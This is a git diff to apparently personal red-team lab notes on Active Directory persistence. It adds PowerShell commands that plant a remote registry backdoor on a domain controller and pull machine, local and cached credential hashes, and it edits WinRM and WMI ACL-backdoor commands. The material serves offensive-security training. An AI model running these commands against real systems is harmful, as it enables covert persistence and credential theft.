@@ -17,23 +17,54 @@ Administrative privileges are required for this, however it is a very impactful 
 ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
 
 ```powershell
-. .\RACE-master\Race.ps1
+. .\Race.ps1
 ```
+
+##### Remote Registry (machine hash backdoor)
+Using RACE or DAMP, with admin privs on remote machine
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+```
+
+As student1, retrieve machine account hash
+```powershell
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
+
+Retrieve local account hash
+```powershell
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+```
+
+Retrieve domain cached credentials
+```powershell
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+```
+
 ##### WinRM
 On a local machine
 ```powershell
-Set-RemotePSRemoting -SamAccountName student1 -Verbose
+Set-RemotePSRemoting -SamAccountName student548 -Verbose
 ```
 
 On a remote machine for user `student548` **without** explicit credentials
 ```powershell
-Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
+Set-RemotePSRemoting -SamAccountName student548 -ComputerName dcorp-dc -Verbose
 ```
 
+Test
+```powershell
+Enter-PSSession -computername dcorp-dc
+```
+
+Removing permissions
+```powershell
+Set-RemotePSRemoting -SamAccountName student548 -ComputerName dcorp-dc -Remove
+```
 ##### WMI
 On a local machine
 ```powershell
-Set-RemoteWMI -SamAccountName student1 -Verbose
+Set-RemoteWMI -SamAccountName student548 -Verbose
 ```
 
 On a remote machine for user `student548` **without** explicit credentials
@@ -43,7 +74,7 @@ Set-RemoteWMI -SamAccountName student548 -ComputerName dcorp-dc -namespace 'root
 
 Removing permissions
 ```powershell
-Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
+Set-RemoteWMI -SamAccountName student548 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
 ```
 
 Test with `gwmi`
